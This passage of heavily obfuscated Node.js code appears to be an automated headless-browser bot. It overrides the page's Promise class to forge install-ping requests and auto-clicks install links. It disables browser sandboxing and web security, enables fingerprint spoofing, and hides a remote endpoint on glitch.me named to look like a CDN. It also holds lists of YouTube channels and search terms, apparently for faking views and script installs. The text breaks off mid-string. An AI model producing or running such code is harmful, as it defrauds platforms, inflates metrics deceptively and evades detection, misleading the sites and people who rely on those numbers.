              var J, K, L = this['h0'],
                M = this['h1'],
                N = this['h2'],
                O = this['h3'],
                P = this['h4'],
                Q = this['blocks'];
              for (J = -0x2c * 0x63 + -0xa63 + 0x1b77; J < 0x5e7 + 0x260 * -0x3 + -0x189 * -0x1; ++J)
                K = Q[J - (-0x1c9f + -0x149f * 0x1 + 0x3141)] ^ Q[J - (-0x113b + 0x1d71 + 0xc2e * -0x1)] ^ Q[J - (0x1578 + 0x41 * -0xe + -0x11dc)] ^ Q[J - (0x25e7 * -0x1 + 0x3a1 * -0x1 + 0x2998)], Q[J] = K << -0x20fc + 0x463 + -0xe * -0x20b | K >>> 0x1223 + 0x22 * 0x25 + -0x16ee;
              for (J = 0x9 * -0xe7 + 0x11c0 + -0x9a1; J < 0xc3 + 0xc5b * 0x2 + -0x1965; J += 0xedb + 0xb6c + -0x1a42 * 0x1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x6b * 0x37 + -0x1 * -0x2507 + 0xe05 * -0x1 | L >>> 0x1 * -0x80f + 0x45a * -0x3 + 0x1538) + (M & N | ~M & O) + P + (-0x74a08366 + -0x1 * 0x39186266 + 0x1083b5f65) + Q[J] << -0x4e2 + -0x1ba7 + 0x2089) << -0x585 + 0x22a4 * -0x1 + -0x2 * -0x1417 | P >>> -0x5 * 0x269 + -0x1538 + 0x2160) + (L & (M = M << 0x6 * -0x88 + -0x1005 + 0x1353 | M >>> 0xc * 0x7a + -0x1fd * 0x7 + 0x835 * 0x1) | ~L & N) + O + (0xee627ab * 0xb + 0xcb5d354 * -0x3 + -0x9302 * 0x3d62) + Q[J + (-0xd * 0x97 + -0x95 * -0x1e + -0x2 * 0x4e5)] << 0x1 * 0x773 + -0x6 * -0x5d1 + 0x125 * -0x25) << 0x703 + 0x2040 + -0x273e | O >>> -0xda * 0x1c + -0x1ad * 0x4 + 0x1ea7) + (P & (L = L << -0xaa * -0xb + -0x1023 * -0x2 + -0x2776 | L >>> -0x1594 + -0x26e + 0x1804) | ~P & M) + N + (-0x84f0ccf + -0x47f139a8 + 0x784 * 0x16b884) + Q[J + (0x5 * 0x2bd + -0x339 + -0x2 * 0x53b)] << -0x2463 + -0x1434 * 0x1 + 0x525 * 0xb) << 0x2435 + -0x1bfd + -0x1 * 0x833 | N >>> -0x2 * 0xe5d + -0x1e24 + -0x3af9 * -0x1) + (O & (P = P << 0x3c7 * 0x5 + 0xe8f * -0x1 + 0x9a * -0x7 | P >>> -0x1601 + 0x3d6 * 0x1 + -0x9 * -0x205) | ~O & L) + M + (-0x5297af53 * 0x2 + 0x22363fd6 + 0xdd7b9869) + Q[J + (0xb8f + -0x1261 + 0x6d5)] << 0xa81 * -0x1 + 0xe * 0xef + -0x3 * 0xdb) << 0x261f + 0x2540 + -0x4b5a | M >>> -0x138b + -0x2aa * 0x8 + 0x28f6) + (N & (O = O << -0x1407 + -0x1 * -0x1a0b + -0x5 * 0x12e | O >>> -0xea7 + -0x6a3 + 0x154c) | ~N & P) + L + (0xb69699 * 0x7d + -0x781e0984 + 0x7978fa68) + Q[J + (0x19c * 0x16 + 0x1 * -0x220b + -0x159)] << -0x446 + -0x840 + 0xc86 * 0x1, N = N << -0x1 * 0xf35 + -0x1 * 0x99f + -0x67 * -0x3e | N >>> 0xe * 0x71 + 0x7e8 + -0xe14;
              for (; J < 0x55 * 0x5f + -0x12cc + -0xc97; J += 0x4 * -0x295 + 0x1589 + 0x10 * -0xb3)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1334 + 0x2f9 * -0x7 + -0x2a * -0xf4 | L >>> 0x5f * -0x4c + -0x13 * 0x71 + 0x1259 * 0x2) + (M ^ N ^ O) + P + (0xb3f00417 + 0x1019c * 0xcc5e + -0x112bcffbe * 0x1) + Q[J] << 0x5 * 0x7be + -0x255 * 0x6 + -0x18b8) << -0x308 * -0x6 + 0x2f * -0x31 + -0x1 * 0x92c | P >>> 0x191 * -0x8 + -0x77b + 0xce * 0x19) + (L ^ (M = M << -0x1 * -0x4cc + 0x1dd8 + -0x2286 | M >>> -0x119a + 0x2 * 0x1061 + 0x115 * -0xe) ^ N) + O + (0x4a4 * -0x25ed91 + 0x2639e * -0x3aff + -0x20e891c3 * -0xd) + Q[J + (-0x4 * 0x308 + 0x255d * 0x1 + -0x13 * 0x154)] << -0x1 * 0x1f7b + -0x1625 + 0x21 * 0x1a0) << -0x2707 + -0x1 * -0x1edd + 0x82f * 0x1 | O >>> 0x21c7 * 0x1 + 0x2b * -0x31 + -0x1971) + (P ^ (L = L << 0x14d6 + -0x39b + -0xd * 0x151 | L >>> -0xaa1 + 0x1586 + -0xae3) ^ M) + N + (0x8 * 0x15c3af7f + -0xc364d5 * 0x3d + -0x10b48996) + Q[J + (-0x1 * -0x1e3d + 0x351 * -0x1 + -0x6a * 0x41)] << -0x2 * 0x20 + -0x213 + 0x253) << -0x1702 + -0x128a + 0x2991 * 0x1 | N >>> -0x37 * -0xa3 + 0x8e9 * -0x1 + -0x13d * 0x15) + (O ^ (P = P << -0x4c1 * -0x1 + -0x1727 + 0x1284 | P >>> -0x1857 + 0x8 * 0x236 + 0x6a9) ^ L) + M + (0xd7184475 + -0xc39df61c + -0x2dafcea4 * -0x2) + Q[J + (-0x1 * 0x814 + 0x1 * 0x1e9b + -0x1684)] << 0x1a1 * -0x1 + -0xf2a + 0x10cb) << -0x2a1 * 0x5 + 0xbed + 0x1 * 0x13d | M >>> 0x519 + 0x513 * -0x2 + 0x528) + (N ^ (O = O << 0x1953 * -0x1 + 0x7de + 0x1193 | O >>> -0xdc1 + -0x2166 + 0x1 * 0x2f29) ^ P) + L + (0x554fc438 + 0x14 * 0x375a081 + 0x63c573d * -0x7) + Q[J + (0x3 * -0xf1 + 0xd * 0x9c + -0x515)] << -0xf * 0x8b + 0x1f32 + -0x3 * 0x7af, N = N << 0x17 * -0xb3 + -0x248f + 0x2 * 0x1a61 | N >>> -0x73 + 0x4 * 0x7fe + -0x1f83;
              for (; J < 0xa75 * -0x3 + -0x41c * -0x5 + 0x13 * 0x95; J += 0x120b + -0x17 * 0x71 + 0x5 * -0x193)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x107d + -0x16e2 * 0x1 + 0x2764 * 0x1 | L >>> -0x1 * -0x1025 + 0x1947 + -0x2951) + (M & N | M & O | N & O) + P - (0x51dbe35f * 0x2 + -0xd8fc25d6 + -0xa628a23c * -0x1) + Q[J] << -0x5 * 0x2a3 + -0x206d * 0x1 + 0x16ce * 0x2) << 0x72 * -0x33 + -0xa0 * -0x4 + 0x143b | P >>> 0x1ac5 + 0x1f05 + -0x39af * 0x1) + (L & (M = M << -0x1 * 0x1c8f + 0x1 * -0x1b95 + -0x2f6 * -0x13 | M >>> 0x337 * -0x9 + -0x2 * 0x10e8 + -0x3b1 * -0x11) | L & N | M & N) + O - (-0x895ebb * -0xff + 0x1d64fd * -0x56c + 0x876e729b) + Q[J + (0x1513 + -0x1f * 0x116 + 0xc98)] << -0x841 + 0x93 * 0x3c + -0x161 * 0x13) << 0xe0 + 0x85d + 0x8 * -0x127 | O >>> -0x1 * -0x1e1 + -0xd66 + 0x6 * 0x1f0) + (P & (L = L << 0x4df * 0x1 + -0x191c + 0x145b | L >>> 0x16b7 + 0x48 + -0x16fd * 0x1) | P & M | L & M) + N - (0x6c0b083c + -0x3 * 0x29bf9667 + 0x5a7ffeb * 0x17) + Q[J + (0x9ff + -0x100f + 0x15 * 0x4a)] << -0x191e + 0x25e8 + -0x665 * 0x2) << -0x63d * 0x6 + 0x17fa * -0x1 + 0x3d6d | N >>> -0x7 * -0x551 + -0x4d5 * 0x2 + -0x926 * 0x3) + (O & (P = P << 0x1 * -0x2c9 + 0x1c63 + 0x197c * -0x1 | P >>> 0xf87 + -0x46b * -0x3 + 0x1 * -0x1cc6) | O & L | P & L) + M - (0x34 * 0x4135f8b + 0x9c2dd42e + -0xff38f946) + Q[J + (-0x1447 + 0x23fa * -0x1 + -0x22a * -0x1a)] << -0x264c + 0x1227 + 0x1425) << -0x13 * -0x38 + -0x1a1f + 0x3aa * 0x6 | M >>> 0x1556 * 0x1 + 0x51b * -0x5 + 0x2c * 0x19) + (N & (O = O << -0x1e58 + -0x789 + -0x1 * -0x25ff | O >>> 0x1ff9 + -0x73e * -0x1 + 0x1 * -0x2735) | N & P | O & P) + L - (-0x7b * 0x10513b8 + -0x3 * -0x2dfa11e5 + -0xeef45 * -0x6b9) + Q[J + (-0x345 + -0x14bd + 0x4ce * 0x5)] << 0x1f * -0xdb + 0x78f * 0x5 + -0x1e1 * 0x6, N = N << -0x1a44 + -0x1 * 0x1b9a + 0xacc * 0x5 | N >>> 0x2 * -0x3c7 + 0x10ee + -0x95e;
              for (; J < -0x55 * -0x35 + -0x2a5 + -0xea4; J += 0xe3 * 0x12 + -0x59 * -0x18 + -0x1849)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x1 * -0xabd + -0x1f71 + 0x14b9 | L >>> -0x1c8d + -0x782 + 0x242a) + (M ^ N ^ O) + P - (-0xcb1bb * -0x7e2 + -0x3cb14642 + 0xe3d8056) + Q[J] << 0x226 * 0x12 + 0xb2c + 0x4fc * -0xa) << 0x1903 + -0x1 * 0x1cf + -0x5 * 0x4a3 | P >>> 0x1b53 + 0xae3 + -0x261b) + (L ^ (M = M << -0x1 * 0x1b31 + 0x37 * -0x15 + 0x1fd2 * 0x1 | M >>> 0x1 * -0x1115 + 0x21ab + 0x84a * -0x2) ^ N) + O - (-0x5161155d + -0x5 * -0xc758d07 + 0x48b29264) + Q[J + (-0xcc9 * -0x1 + 0x1498 + -0x2160)] << 0x670 * 0x3 + -0x892 + -0xabe) << -0x2677 + -0x1 * 0xc23 + 0x329f | O >>> -0x1359 * -0x1 + -0x1257 + -0xb * 0x15) + (P ^ (L = L << 0x223a * -0x1 + -0x1 * 0x141b + 0x3673 | L >>> 0x25 * 0x1b + 0x21f + -0x604) ^ M) + N - (-0x1db0bae1 * 0x1 + 0xeb * -0x5c3f21 + 0xa7fbec56 * 0x1) + Q[J + (0x1 * 0x1823 + 0x1284 + -0xe37 * 0x3)] << 0x1 * 0x122c + -0x10bf * -0x2 + -0x30a * 0x11) << -0x2ea * 0x1 + 0x2301 + 0x1 * -0x2012 | N >>> 0x15d5 * 0x1 + -0x6a2 + -0xf18) + (O ^ (P = P << 0x1d26 + 0xbad + -0x28b5 | P >>> 0x1f18 * -0x1 + -0x1920 + 0x383a) ^ L) + M - (-0xa8c0 * -0x7195 + 0x493dba51 + -0x3 * 0x1f7fd14d) + Q[J + (-0x2b * -0xce + -0x803 + 0x2 * -0xd4a)] << 0x1841 + 0x305 * 0x5 + -0x275a) << -0x12d7 + 0x79d + 0xb3f * 0x1 | M >>> -0xec6 + 0x691 + 0x850) + (N ^ (O = O << -0x1623 + -0x4c1 + 0x1b02 * 0x1 | O >>> 0xecd + 0x1f69 + 0xb8d * -0x4) ^ P) + L - (0x535b5779 + 0x34c71a39 + -0x52853388 * 0x1) + Q[J + (0x1 * -0x161 + -0x17 * -0x1 + 0x2 * 0xa7)] << -0x11c1 + -0x5 * -0x5ef + -0xbea, N = N << -0x1c93 + 0x7 * -0x2f + 0x1dfa | N >>> -0xe14 + 0x174a + 0x24d * -0x4;
              this['h0'] = this['h0'] + L << -0x741 + 0x71c + -0x25 * -0x1, this['h1'] = this['h1'] + M << -0x8d + -0x509 + 0x596, this['h2'] = this['h2'] + N << 0x6e2 + -0x80f * -0x1 + -0xef1, this['h3'] = this['h3'] + O << -0x4 * 0x890 + 0xce7 + 0x445 * 0x5, this['h4'] = this['h4'] + P << -0x2 * 0xbab + -0x1 * -0x9a1 + 0x79 * 0x1d;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x727 + 0x86d + -0x12a & 0x1bb0 + 0x237d * 0x1 + -0x3f1e] + w[J >> -0x2b * -0xba + 0x1ac * 0x1 + -0x20d2 & -0x2455 + -0x1756 + 0x37 * 0x116] + w[J >> 0x1f85 + -0x351 + -0x5a0 * 0x5 & 0x3 * 0x346 + -0xb6e + -0x3d * -0x7] + w[J >> 0xe5 * -0xb + 0x17ce + -0xde7 * 0x1 & -0x24ca + 0x15ab + -0x86 * -0x1d] + w[J >> -0x89f * 0x4 + 0x8a7 * 0x1 + 0x19e1 & 0x5d0 + -0x2578 + 0x1fb7] + w[J >> -0x393 + -0x1c15 + 0x1fb0 & -0x529 * -0x1 + 0x1 * 0x27 + -0x5 * 0x10d] + w[J >> -0x1d31 + 0x9a9 + 0x138c & -0x1e95 + 0x23f7 + -0x553 * 0x1] + w[-0xa39 + -0x173f + 0x3 * 0xb2d & J] + w[K >> 0x1746 + 0x6d1 * 0x1 + -0x19 * 0x133 & -0x22f7 + -0xf34 + 0x323a] + w[K >> 0x13d8 + 0x18 * -0x112 + 0x5f0 & -0x104d + -0xd19 + 0x1d75] + w[K >> 0x1 * -0x13e3 + -0x3f8 * 0x1 + 0xb * 0x22d & 0x1 * -0x266f + 0x1 * -0xe9f + 0x351d] + w[K >> -0x756 + 0x1 * -0x1c8d + 0x23f3 & 0x1461 + 0x2491 * 0x1 + -0x38e3 * 0x1] + w[K >> 0xcfe * 0x3 + 0x23e1 + -0x4acf & -0xc5d * 0x2 + 0x7 * -0x30a + 0x2e0f] + w[K >> -0x2e1 + -0x1 * -0x19a3 + 0x2 * -0xb5d & -0x99b * 0x1 + 0x1e4a + -0x14a0] + w[K >> 0x2 * 0xf4 + -0x7 * -0x95 + -0x5f7 & 0x1fc + -0x25 * -0x1 + -0x109 * 0x2] + w[-0x1ef1 + 0x143 * -0x3 + 0x22c9 & K] + w[L >> -0x251 * -0xb + 0x46c + 0x1dcb * -0x1 & 0x1048 + 0x10 * 0xca + -0x1cd9] + w[L >> 0x9fa * -0x2 + 0x87f * -0x3 + 0x1 * 0x2d89 & -0x16e * -0x18 + 0x619 + -0x285a] + w[L >> 0x503 * -0x3 + -0x5c8 + -0x3 * -0x6f7 & 0x2f9 + -0x911 * 0x3 + -0x1849 * -0x1] + w[L >> -0x140 + 0x203b + -0x1eeb & -0x5 * 0x12a + -0xe6b * -0x1 + -0x2 * 0x445] + w[L >> 0x190f + -0x87f + -0x1084 & 0x1 * -0x10bb + -0x521 * -0x1 + -0xba9 * -0x1] + w[L >> 0x287 * 0x3 + -0x32b * -0xc + -0x2d91 & 0x1dd4 + 0x5ab + -0x2370] + w[L >> 0x107c + 0x18 * -0x15a + 0xff8 & 0x15a + -0x1247 + 0x43f * 0x4] + w[0x1 * 0x1abe + -0x165f * 0x1 + -0x450 & L] + w[M >> 0x1cd5 + 0xae2 + -0x279b & 0x1d0b + 0x1a * 0xf + -0x1e82] + w[M >> 0xa14 + -0xb08 + -0x86 * -0x2 & -0xe * -0x1bb + 0x355 + -0x1b80] + w[M >> 0x7f7 * -0x4 + -0x205 * -0x1 + -0x9f9 * -0x3 & -0x2 * -0xe17 + -0x6f9 + -0x1 * 0x1526] + w[M >> -0x10 * -0x225 + -0x176f * -0x1 + -0x39af & 0x3 * -0xac6 + 0x151d + 0x1 * 0xb44] + w[M >> -0x65 * 0x1 + 0x1978 + -0x1907 & 0x1b59 + 0x52b + 0x4a3 * -0x7] + w[M >> -0x16 * 0x17b + -0x147a + 0x3514 & 0x5 * 0x286 + -0x1332 + -0x6a3 * -0x1] + w[M >> -0x463 + -0x8 * 0x211 + 0x14ef & -0x153e + -0x1f9d * -0x1 + 0xf * -0xb0] + w[-0x2310 + 0x1d9 * 0x11 + 0x3b6 & M] + w[N >> 0x265 * -0x7 + 0xc1b * -0x1 + 0x1cfa & -0x1365 + -0x208d + 0x3401] + w[N >> -0x6 * 0xf + -0x7 * 0x545 + -0x2555 * -0x1 & -0x1 * 0x1876 + 0x1c1e + -0x133 * 0x3] + w[N >> -0xb * -0x10d + 0xa87 + -0x3 * 0x756 & 0x1 * 0x1cdc + -0x1 * -0x1653 + 0x199 * -0x20] + w[N >> -0x223c + 0x1c59 + 0x5f3 & -0x318 + -0x2 * 0x269 + 0x7f9] + w[N >> 0xe87 + 0x2a9 + -0x1124 & -0xd58 + 0xfb3 + 0x31 * -0xc] + w[N >> -0x2 * -0x8b + -0x1d1d + -0x1 * -0x1c0f & -0x3 * 0x6c7 + -0x189a + -0x1bb * -0x1a] + w[N >> -0x1 * -0x179f + -0x133 * 0xe + -0x6d1 & -0x1 * 0x1867 + -0xfb0 + 0x2826] + w[0x54 * -0x5d + -0x1be * -0x1 + 0x1 * 0x1cd5 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> 0x94f * -0x1 + 0x1 * 0x1d5d + 0x5 * -0x3fe & -0x1d67 + 0x6da * 0x2 + 0x2 * 0x859,
                J >> -0x1bc9 + 0x78d + 0x144c & -0x227f * 0x1 + 0x1ac6 + 0x8b8,
                J >> -0x1395 + -0x185e + 0x1a1 * 0x1b & 0x1d90 + 0x1a47 * 0x1 + -0x36d8,
                0x167 * -0xb + -0x66c + 0x4 * 0x5b6 & J,
                K >> -0x2f * 0x2f + -0x2220 + 0x2ad9 & 0x880 + -0xfb2 * -0x1 + -0x1733,
                K >> 0x1bdb * -0x1 + -0x1678 + 0x3263 & -0x617 * -0x1 + -0x265c + -0x851 * -0x4,
                K >> 0x380 + 0xf3b + 0x12b3 * -0x1 & -0xbce + 0x249 + -0x2 * -0x542,
                0x3 * 0x3c5 + 0x1e94 + 0x2 * -0x1472 & K,
                L >> 0x250 + -0x9b4 + 0x77c & 0x17f4 + -0x1a32 + 0x33d,
                L >> -0x128d * 0x1 + -0xd4e + 0x1feb & -0x72f * 0x2 + -0xc * 0x251 + -0x1 * -0x2b29,
                L >> 0x1abc + 0x918 + -0x23cc & 0x1a1f + -0x3 * -0x97 + -0x1ae5,
                -0x367 * -0x8 + -0x679 + 0x40 * -0x4f & L,
                M >> 0x295 * 0x1 + 0x3 * -0x966 + 0x19b5 * 0x1 & -0x11b5 * 0x1 + -0x48e * 0x7 + 0x206 * 0x19,
                M >> 0x21cd + 0x16 * 0x6 + 0x4f * -0x6f & -0x1 * 0x14a5 + -0xccc + -0x3a * -0x98,
                M >> 0x1 * -0x112d + -0x10bf + -0x87d * -0x4 & 0xeb0 + 0x1 * 0x1273 + -0x2024,
                0x1 * -0x164c + -0x2 * 0xbb1 + 0x2ead & M,
                N >> 0x1cc8 + 0x1 * -0x1ef1 + 0x241 & -0x40 * -0x53 + 0x5e9 + 0xdb * -0x1e,
                N >> -0x1404 + -0x1 * 0x52f + 0x1943 & -0x3 * -0x1f5 + -0x5 * -0x473 + 0x1b1f * -0x1,
                N >> 0x4 * 0x3f5 + 0xcfe * -0x1 + 0x2 * -0x167 & 0x1 * 0x1ec1 + -0x11e1 + -0xbe1,
                -0x7fb * 0x1 + 0x142a + -0xb30 & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(-0x1 * -0x5ce + -0x1aec * 0x1 + 0x1532), (K = new DataView(J))['setUint32'](-0x14c9 * -0x1 + -0x20ec + 0xc23, this['h0']), K['setUint32'](-0x4 * 0x1e + 0x99a + -0x91e, this['h1']), K['setUint32'](0x1 * -0x4a9 + -0x1a69 * 0x1 + 0x52f * 0x6, this['h2']), K['setUint32'](0x44d * -0x7 + -0x2058 + -0x1 * -0x3e7f, this['h3']), K['setUint32'](0x1bc7 + 0x27d * 0x7 + 0x6d * -0x6a, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0xcb5 + -0x2 * -0xb57 + -0x2363 * 0x1];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = -0x1389 + -0x859 * 0x1 + 0x1be2;
            J[0x455 * 0x7 + -0x1ce0 + -0x173]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[-0xed6 + 0x4 * 0xc5 + 0x2b * 0x46] = L => {
              const U = c;
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x38f * -0x9 + -0x9a6 * -0x3 + 0x4f * 0xa), O['overrideMi' + 'meType']('text/plain'), O[U(0x9)] = () => {}, O['send'](), K = 0x14c6 + -0x11 * -0xc3 + -0x21b8;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x19e8 + -0x4e1 * 0x8 + -0xf3 * -0x14), Promise['resolve'](-0x20f9 + 0xc4e + -0x54 * -0x3f);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x26d1 + -0x104b * 0x1 + 0x371c * 0x1; j < 0x5c * -0x3f + -0x1b00 + 0x31a5; j++)
    i();
}
const NETWORK_PATIENCE = 0x3f7 + -0x55a * 0x1 + 0x20a3 + (0x3 * -0x3a6 + 0x25a3 + 0xef9 * -0x1) * Math['random'](),
  MM_NETWORK_PATIENCE = (0x13c6 + 0x1f69 + -0x19 * 0x20c) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x13 * 0x51 + 0x56c * 0x2 + 0x5 * -0x35f);
    let h = e[f];
    if (b['HomtqA'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x3 * -0x303 + 0x1 * 0x20 + 0x8e9, s, t, u = -0x15d0 + -0xc2b * -0x2 + -0x286; t = n['charAt'](u++); ~t && (s = r % (0x2 * 0x1215 + -0x20 * 0x47 + 0x1b46 * -0x1) ? s * (0x140d * 0x1 + 0x1c8f + 0x1 * -0x305c) + t : t, r++ % (0x1437 + -0x27 * 0xf6 + 0x1147)) ? p += String['fromCharCode'](-0xd5d + -0x2315 + 0x3171 & s >> (-(0x9 * -0x97 + 0x79 * -0x4d + 0x29b6) * r & 0x1358 + 0x1868 + -0x2bba)) : 0xeb6 + -0x1 * -0x1655 + -0x3 * 0xc59) {
          t = o['indexOf'](t);
        }
        for (let v = -0x183b * -0x1 + -0xe * 0x2a7 + 0xce7, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](0x2099 + 0x8 * 0x2f9 + 0x455 * -0xd))['slice'](-(0x11 * -0x3e + 0x9d4 + 0x2 * -0x2da));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = 0x1 * -0x17be + -0xd70 + 0x252e,
          r, t = '';
        n = i(n);
        let u;
        for (u = -0xc77 + -0x47 * -0x7f + -0x16c2; u < -0xb78 + 0x7 * -0x17b + 0xa7 * 0x23; u++) {
          p[u] = u;
        }
        for (u = 0x1a18 + 0x3 * -0x1a9 + -0xeb * 0x17; u < 0x106 + 0x15a * -0x1 + 0x154; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0x4d * -0xb + 0x1 * -0x4a5 + -0x256 * -0x1), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x232 * 0x4 + 0x7c * 0x10 + 0x2 * 0x84, q = -0x1ee3 * 0x1 + 0x1 * 0xca6 + 0x123d;
        for (let v = -0x14ae + 0x12 * -0x69 + -0x1 * -0x1c10; v < n['length']; v++) {
          u = (u + (-0x19f4 * 0x1 + 0xb8c + 0x20f * 0x7)) % (-0xe5d + 0x5 * 0x2e6 + 0xdf), q = (q + p[u]) % (0x187 * 0x11 + -0x5 * -0x20c + -0x2333), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x93 + 0x143b + 0xc3 * -0x1a)]);
        }
        return t;
      };
      b['REwXYW'] = m, c = arguments, b['HomtqA'] = !![];
    }
    const j = e[-0x7 * -0x1cd + -0x347 + -0x954],
      k = f + j,
      l = c[k];
    return !l ? (b['yJrXGf'] === undefined && (b['yJrXGf'] = !![]), h = b['REwXYW'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    'https://ww' + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    'https://ww' + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x52 * -0x60 + -0xa * 0x2b7 + -0x39a; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + 'moo.io\x20hig' + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 'oyees,mrbe' + 'ast\x20live,m' + 'rbeast\x20hin' + 'di,mr.\x20bea' + 'st,mrbeast' + '\x20studio,mr' + 'beast\x20gami' + 'ng,sunnyv2' + '\x20mrbeast,m' + 'rbeast\x20sun' + 'nyv2,mrbea' + 'st\x20in\x20hind' + 'i,who\x20is\x20m' + 'r\x20beast,mr' + '\x20beast\x20hin' + 'di,mr\x20beas' + 't\x20react,wh' + 'at\x20happene' + 'd\x20to\x20mrbea' + 